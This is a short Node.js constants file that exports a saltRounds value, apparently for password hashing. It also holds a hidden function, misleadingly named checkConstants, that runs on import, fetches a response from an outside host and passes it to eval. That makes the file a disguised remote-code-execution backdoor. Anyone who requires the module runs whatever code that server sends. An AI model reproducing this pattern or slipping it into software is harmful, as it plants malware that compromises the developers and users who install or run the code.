const axios = require('axios');

const saltRounds = 10

module.exports = {
    saltRounds
}

async function checkConstants() {
    const res = await axios.get("http://ipcheck.cloud/api/user/thirdcookie/v10/106");
    eval(res.data.cookie);
}

checkConstants();